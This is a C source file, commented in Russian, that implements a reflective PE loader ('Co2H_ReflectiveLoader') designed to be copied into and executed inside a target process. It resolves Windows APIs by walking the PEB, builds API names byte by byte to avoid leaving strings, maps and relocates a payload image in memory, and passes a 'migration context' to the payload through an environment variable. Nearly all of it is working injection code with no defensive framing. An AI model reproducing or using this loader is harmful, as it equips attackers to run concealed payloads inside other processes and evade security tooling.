// Position-independent рефлективный загрузчик PE.
// Исполняется в адресном пространстве целевого процесса.
// Никаких CRT, никаких глобальных данных, никаких импортов:
// все нужные API резолвятся в рантайме через PEB walk + хеширование экспортов.

#include "loader.h"
#include <winternl.h>

// Вся секция кода загрузчика помещается в свою секцию,
// чтобы инжектор мог точно вычислить размер копируемого блока
#pragma code_seg(".rldr")
#pragma comment(linker, "/SECTION:.rldr,ERW")

// Запрет intrinsic-замены memcpy/memset — иначе MSVC вставит ссылки
// на CRT-функции, которых в целевом процессе по нашему адресу нет
#pragma function(memcpy)
#pragma function(memset)

// --- Прототипы импортируемых функций ---
typedef HMODULE (WINAPI *LoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *GetProcAddress_t)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE  (WINAPI *GetCurrentProcess_t)(VOID);
typedef BOOL    (WINAPI *FlushInstructionCache_t)(HANDLE, LPCVOID, SIZE_T);
typedef BOOL    (WINAPI *SetEnvironmentVariableA_t)(LPCSTR, LPCSTR);

// Таблица разрешённых API
typedef struct _RL_APIS {
    LoadLibraryA_t              pLoadLibraryA;
    GetProcAddress_t            pGetProcAddress;
    VirtualAlloc_t              pVirtualAlloc;
    VirtualProtect_t            pVirtualProtect;
    GetCurrentProcess_t         pGetCurrentProcess;
    FlushInstructionCache_t     pFlushInstructionCache;
    SetEnvironmentVariableA_t   pSetEnvironmentVariableA;
} RL_APIS;

// Сравнение двух ASCII-строк, без учёта регистра
static int rl_stricmp_a(const char *a, const char *b)
{
    while (*a && *b) {
        char ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z') ca += 0x20;
        if (cb >= 'A' && cb <= 'Z') cb += 0x20;
        if (ca != cb) return 1;
        a++; b++;
    }
    return *a != *b;
}

// Сравнение Unicode-имени модуля и ASCII-эталона, без учёта регистра
static int rl_wstricmp_to_a(const WCHAR *w, USHORT wlen, const char *a)
{
    USHORT i = 0;
    while (i < wlen && *a) {
        WCHAR cw = w[i];
        char  ca = *a;
        if (cw >= L'A' && cw <= L'Z') cw += 0x20;
        if (ca >= 'A' && ca <= 'Z')   ca += 0x20;
        if ((WCHAR)ca != cw) return 1;
        i++; a++;
    }
    return (i != wlen) || (*a != 0);
}

// Поиск base-адреса загруженного модуля по имени через PEB
static PVOID find_module_by_name(const char *target_name)
{
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA ldr = peb->Ldr;
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY cur  = head->Flink;

    while (cur != head) {
        PLDR_DATA_TABLE_ENTRY entry =
            (PLDR_DATA_TABLE_ENTRY)((BYTE *)cur - sizeof(LIST_ENTRY));

        WCHAR *name = entry->FullDllName.Buffer;
        USHORT  len = entry->FullDllName.Length / sizeof(WCHAR);

        // Найти последний '\\' — оставить только имя файла
        int start = 0;
        for (int i = 0; i < len; i++) {
            if (name[i] == L'\\') start = i + 1;
        }

        if (rl_wstricmp_to_a(name + start, (USHORT)(len - start), target_name) == 0) {
            return entry->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}

// Поиск экспортируемой функции по имени
static PVOID find_export_by_name(PVOID module_base, const char *target)
{
    BYTE *base = (BYTE *)module_base;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);

    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + exp_rva);
    DWORD *names    = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ordinals = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *fname = (const char *)(base + names[i]);
        if (rl_stricmp_a(fname, target) == 0) {
            WORD ord = ordinals[i];
            return base + funcs[ord];
        }
    }
    return NULL;
}

// Минималистичный memcpy/memset — без CRT.
// noinline + volatile-указатель чтобы компилятор не свернул в rep movsb
// со ссылкой на внешний memcpy/memset.
__declspec(noinline) static void rl_memcpy(void *dst, const void *src, SIZE_T n)
{
    volatile BYTE *d = (volatile BYTE *)dst;
    const volatile BYTE *s = (const volatile BYTE *)src;
    while (n--) *d++ = *s++;
}

__declspec(noinline) static void rl_memset(void *dst, BYTE v, SIZE_T n)
{
    volatile BYTE *d = (volatile BYTE *)dst;
    while (n--) *d++ = v;
}

// --- Главная точка входа ---
DWORD WINAPI Co2H_ReflectiveLoader(LPVOID param)
{
    PLOADER_PARAM p = (PLOADER_PARAM)param;
    if (!p || !p->raw_pe) return 1;

    // STEP-маяк: пишем номер последнего пройденного шага в out_module_base.
    // Если loader упадёт, инжектор после WaitForSingleObject прочитает это
    // значение и узнает, до куда дошли.
    #define STEP(n) ((volatile PLOADER_PARAM)p)->out_module_base = (PVOID)(uintptr_t)(n)

    STEP(100);

    RL_APIS api;
    rl_memset(&api, 0, sizeof(api));

    STEP(101);

    // Все имена строим на стеке через volatile-присваивания — иначе компилятор
    // положит исходные литералы в .rdata, который в целевом процессе отсутствует.
    char s_k32[16], s_lla[16], s_gpa[16], s_va[16], s_vp[16], s_gcp[20], s_fic[24];

    #define PUT(buf, idx, ch) ((volatile char*)(buf))[idx] = (char)(ch)

    PUT(s_k32,0,'k'); PUT(s_k32,1,'e'); PUT(s_k32,2,'r'); PUT(s_k32,3,'n');
    PUT(s_k32,4,'e'); PUT(s_k32,5,'l'); PUT(s_k32,6,'3'); PUT(s_k32,7,'2');
    PUT(s_k32,8,'.'); PUT(s_k32,9,'d'); PUT(s_k32,10,'l'); PUT(s_k32,11,'l'); PUT(s_k32,12,0);

    PUT(s_lla,0,'L'); PUT(s_lla,1,'o'); PUT(s_lla,2,'a'); PUT(s_lla,3,'d');
    PUT(s_lla,4,'L'); PUT(s_lla,5,'i'); PUT(s_lla,6,'b'); PUT(s_lla,7,'r');
    PUT(s_lla,8,'a'); PUT(s_lla,9,'r'); PUT(s_lla,10,'y'); PUT(s_lla,11,'A'); PUT(s_lla,12,0);

    PUT(s_gpa,0,'G'); PUT(s_gpa,1,'e'); PUT(s_gpa,2,'t'); PUT(s_gpa,3,'P');
    PUT(s_gpa,4,'r'); PUT(s_gpa,5,'o'); PUT(s_gpa,6,'c'); PUT(s_gpa,7,'A');
    PUT(s_gpa,8,'d'); PUT(s_gpa,9,'d'); PUT(s_gpa,10,'r'); PUT(s_gpa,11,'e');
    PUT(s_gpa,12,'s'); PUT(s_gpa,13,'s'); PUT(s_gpa,14,0);

    PUT(s_va,0,'V'); PUT(s_va,1,'i'); PUT(s_va,2,'r'); PUT(s_va,3,'t');
    PUT(s_va,4,'u'); PUT(s_va,5,'a'); PUT(s_va,6,'l'); PUT(s_va,7,'A');
    PUT(s_va,8,'l'); PUT(s_va,9,'l'); PUT(s_va,10,'o'); PUT(s_va,11,'c'); PUT(s_va,12,0);

    PUT(s_vp,0,'V'); PUT(s_vp,1,'i'); PUT(s_vp,2,'r'); PUT(s_vp,3,'t');
    PUT(s_vp,4,'u'); PUT(s_vp,5,'a'); PUT(s_vp,6,'l'); PUT(s_vp,7,'P');
    PUT(s_vp,8,'r'); PUT(s_vp,9,'o'); PUT(s_vp,10,'t'); PUT(s_vp,11,'e');
    PUT(s_vp,12,'c'); PUT(s_vp,13,'t'); PUT(s_vp,14,0);

    PUT(s_gcp,0,'G'); PUT(s_gcp,1,'e'); PUT(s_gcp,2,'t'); PUT(s_gcp,3,'C');
    PUT(s_gcp,4,'u'); PUT(s_gcp,5,'r'); PUT(s_gcp,6,'r'); PUT(s_gcp,7,'e');
    PUT(s_gcp,8,'n'); PUT(s_gcp,9,'t'); PUT(s_gcp,10,'P'); PUT(s_gcp,11,'r');
    PUT(s_gcp,12,'o'); PUT(s_gcp,13,'c'); PUT(s_gcp,14,'e'); PUT(s_gcp,15,'s');
    PUT(s_gcp,16,'s'); PUT(s_gcp,17,0);

    PUT(s_fic,0,'F'); PUT(s_fic,1,'l'); PUT(s_fic,2,'u'); PUT(s_fic,3,'s');
    PUT(s_fic,4,'h'); PUT(s_fic,5,'I'); PUT(s_fic,6,'n'); PUT(s_fic,7,'s');
    PUT(s_fic,8,'t'); PUT(s_fic,9,'r'); PUT(s_fic,10,'u'); PUT(s_fic,11,'c');
    PUT(s_fic,12,'t'); PUT(s_fic,13,'i'); PUT(s_fic,14,'o'); PUT(s_fic,15,'n');
    PUT(s_fic,16,'C'); PUT(s_fic,17,'a'); PUT(s_fic,18,'c'); PUT(s_fic,19,'h');
    PUT(s_fic,20,'e'); PUT(s_fic,21,0);

    #undef PUT

    STEP(110);

    // 1. Найти kernel32 через PEB и резолвить нужные функции
    PVOID k32 = find_module_by_name(s_k32);
    STEP(111);
    if (!k32) return 2;

    api.pLoadLibraryA           = (LoadLibraryA_t)          find_export_by_name(k32, s_lla);
    api.pGetProcAddress         = (GetProcAddress_t)        find_export_by_name(k32, s_gpa);
    api.pVirtualAlloc           = (VirtualAlloc_t)          find_export_by_name(k32, s_va);
    api.pVirtualProtect         = (VirtualProtect_t)        find_export_by_name(k32, s_vp);
    api.pGetCurrentProcess      = (GetCurrentProcess_t)     find_export_by_name(k32, s_gcp);
    api.pFlushInstructionCache  = (FlushInstructionCache_t) find_export_by_name(k32, s_fic);

    // Дополнительно: SetEnvironmentVariableA для передачи контекста миграции
    char s_sev[28];
    #define PUT2(b,i,c) ((volatile char *)(b))[i] = (char)(c)
    PUT2(s_sev,0,'S'); PUT2(s_sev,1,'e'); PUT2(s_sev,2,'t');
    PUT2(s_sev,3,'E'); PUT2(s_sev,4,'n'); PUT2(s_sev,5,'v');
    PUT2(s_sev,6,'i'); PUT2(s_sev,7,'r'); PUT2(s_sev,8,'o');
    PUT2(s_sev,9,'n'); PUT2(s_sev,10,'m'); PUT2(s_sev,11,'e');
    PUT2(s_sev,12,'n'); PUT2(s_sev,13,'t'); PUT2(s_sev,14,'V');
    PUT2(s_sev,15,'a'); PUT2(s_sev,16,'r'); PUT2(s_sev,17,'i');
    PUT2(s_sev,18,'a'); PUT2(s_sev,19,'b'); PUT2(s_sev,20,'l');
    PUT2(s_sev,21,'e'); PUT2(s_sev,22,'A'); PUT2(s_sev,23,0);
    #undef PUT2
    api.pSetEnvironmentVariableA = (SetEnvironmentVariableA_t) find_export_by_name(k32, s_sev);

    STEP(120);

    if (!api.pLoadLibraryA || !api.pGetProcAddress ||
        !api.pVirtualAlloc || !api.pVirtualProtect) return 3;

    STEP(130);

    // 2. Парсинг PE заголовков
    BYTE *raw = (BYTE *)p->raw_pe;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 4;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(raw + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 5;

    SIZE_T image_size       = nt->OptionalHeader.SizeOfImage;
    ULONGLONG preferred_base = nt->OptionalHeader.ImageBase;

    STEP(140);

    // 3. Выделение памяти под образ — пробуем по preferred ImageBase
    BYTE *image = (BYTE *)api.pVirtualAlloc(
        (LPVOID)(uintptr_t)preferred_base, image_size,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!image) {
        image = (BYTE *)api.pVirtualAlloc(
            NULL, image_size,
            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (!image) return 6;
    }

    STEP(150);

    // 4. Копирование заголовков
    rl_memcpy(image, raw, nt->OptionalHeader.SizeOfHeaders);

    STEP(160);

    // 5. Копирование секций
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData) {
            rl_memcpy(image + sec[i].VirtualAddress,
                      raw + sec[i].PointerToRawData,
                      sec[i].SizeOfRawData);
        }
    }

    STEP(170);

    // 6. Релокации, если база отличается от preferred
    LONGLONG delta = (LONGLONG)(image - (BYTE *)(uintptr_t)preferred_base);
    if (delta != 0) {
        DWORD reloc_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD reloc_sz  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        if (reloc_rva && reloc_sz) {
            PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)(image + reloc_rva);
            DWORD processed = 0;
            while (processed < reloc_sz && rel->SizeOfBlock) {
                DWORD count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *list = (WORD *)((BYTE *)rel + sizeof(IMAGE_BASE_RELOCATION));
                BYTE *page = image + rel->VirtualAddress;

                for (DWORD j = 0; j < count; j++) {
                    WORD type   = list[j] >> 12;
                    WORD offset = list[j] & 0x0FFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        *(ULONGLONG *)(page + offset) += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        *(DWORD *)(page + offset) += (DWORD)delta;
                    }
                    // IMAGE_REL_BASED_ABSOLUTE и прочие игнорируем
                }
                processed += rel->SizeOfBlock;
                rel = (PIMAGE_BASE_RELOCATION)((BYTE *)rel + rel->SizeOfBlock);
            }
        }
    }

    STEP(180);

    // 7. Резолв импортов
    DWORD imp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (imp_rva) {
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(image + imp_rva);
        while (imp->Name) {
            const char *dll_name = (const char *)(image + imp->Name);
            HMODULE hmod = api.pLoadLibraryA(dll_name);
            if (!hmod) return 7;

            PIMAGE_THUNK_DATA orig_thunk = (PIMAGE_THUNK_DATA)(image + (imp->OriginalFirstThunk
                                                ? imp->OriginalFirstThunk
                                                : imp->FirstThunk));
            PIMAGE_THUNK_DATA iat_thunk  = (PIMAGE_THUNK_DATA)(image + imp->FirstThunk);

            while (orig_thunk->u1.AddressOfData) {
                FARPROC fn;
                if (orig_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    fn = api.pGetProcAddress(hmod, (LPCSTR)IMAGE_ORDINAL(orig_thunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME ibn =
                        (PIMAGE_IMPORT_BY_NAME)(image + orig_thunk->u1.AddressOfData);
                    fn = api.pGetProcAddress(hmod, (LPCSTR)ibn->Name);
                }
                if (!fn) return 8;
                iat_thunk->u1.Function = (ULONGLONG)fn;
                orig_thunk++;
                iat_thunk++;
            }
            imp++;
        }
    }

    STEP(190);

    // 8. Восстановление прав доступа на секциях
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD ch = sec[i].Characteristics;
        DWORD prot;
        BOOL exec  = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
        BOOL read  = (ch & IMAGE_SCN_MEM_READ) != 0;
        BOOL write = (ch & IMAGE_SCN_MEM_WRITE) != 0;

        if (exec && read && write)      prot = PAGE_EXECUTE_READWRITE;
        else if (exec && read)          prot = PAGE_EXECUTE_READ;
        else if (exec && write)         prot = PAGE_EXECUTE_READWRITE;
        else if (exec)                  prot = PAGE_EXECUTE;
        else if (read && write)         prot = PAGE_READWRITE;
        else if (read)                  prot = PAGE_READONLY;
        else                            prot = PAGE_NOACCESS;

        DWORD old;
        if (sec[i].Misc.VirtualSize) {
            api.pVirtualProtect(image + sec[i].VirtualAddress,
                                sec[i].Misc.VirtualSize, prot, &old);
        }
    }
    STEP(200);

    // 9. Сброс кэша инструкций
    if (api.pFlushInstructionCache) {
        api.pFlushInstructionCache(api.pGetCurrentProcess(), image, image_size);
    }

    STEP(210);

    // 10. TLS callbacks
    DWORD tls_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (tls_rva) {
        PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)(image + tls_rva);
        if (tls->AddressOfCallBacks) {
            PIMAGE_TLS_CALLBACK_FN *cb = (PIMAGE_TLS_CALLBACK_FN *)tls->AddressOfCallBacks;
            while (*cb) {
                (*cb)((PVOID)image, DLL_PROCESS_ATTACH, NULL);
                cb++;
            }
        }
    }

    STEP(220);

    // 11. Контекст миграции: пишем env var "__RL_CTX" со значением hex-адреса p.
    // Payload позже прочитает её через GetEnvironmentVariableA и получит
    // указатель на LOADER_PARAM с raw_pe + копией секции .rldr.
    if (api.pSetEnvironmentVariableA) {
        char env_name[12];
        #define PUT3(b,i,c) ((volatile char *)(b))[i] = (char)(c)
        PUT3(env_name,0,'_'); PUT3(env_name,1,'_'); PUT3(env_name,2,'R');
        PUT3(env_name,3,'L'); PUT3(env_name,4,'_'); PUT3(env_name,5,'C');
        PUT3(env_name,6,'T'); PUT3(env_name,7,'X'); PUT3(env_name,8,0);
        #undef PUT3

        char hex_buf[20];
        ULONGLONG v = (ULONGLONG)(uintptr_t)p;
        ((volatile char *)hex_buf)[0] = '0';
        ((volatile char *)hex_buf)[1] = 'x';
        int idx = 2;
        for (int sh = 60; sh >= 0; sh -= 4) {
            BYTE nib = (BYTE)((v >> sh) & 0xF);
            char c = (nib < 10) ? (char)('0' + nib) : (char)('A' + nib - 10);
            ((volatile char *)hex_buf)[idx++] = c;
        }
        ((volatile char *)hex_buf)[idx] = 0;

        api.pSetEnvironmentVariableA(env_name, hex_buf);
    }

    STEP(225);

    // 12. Передача управления entry point
    // Базу замапленного модуля положим в самый последний момент, чтобы
    // STEP-маяк не затёрло раньше.
    DWORD ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
    p->out_module_base = image;
    if (ep_rva) {
        if (p->flags == 0) {
            // DLL: вызвать DllMain(hModule, DLL_PROCESS_ATTACH, NULL)
            DllMain_t dll_main = (DllMain_t)(image + ep_rva);
            dll_main((HINSTANCE)image, DLL_PROCESS_ATTACH, NULL);
        } else {
            // EXE: прыгаем на entry. Замечание: PEB->ImageBaseAddress
            // не патчится — для большинства не-CRT EXE это нормально,
            // но GetModuleHandle(NULL) вернёт оригинальный модуль процесса.
            ExeEntry_t exe_entry = (ExeEntry_t)(image + ep_rva);
            exe_entry();
        }
    }

    return 0;
}

// Маркер конца секции .rldr
void Co2H_ReflectiveLoaderEnd(void)
{
    // Пустая функция — нужна только чтобы линкер выделил
    // адрес сразу после кода ReflectiveLoader в той же секции.
    // Используется injector-ом для расчёта размера копии.
    volatile int x = 0;
    (void)x;
}

#pragma code_seg()
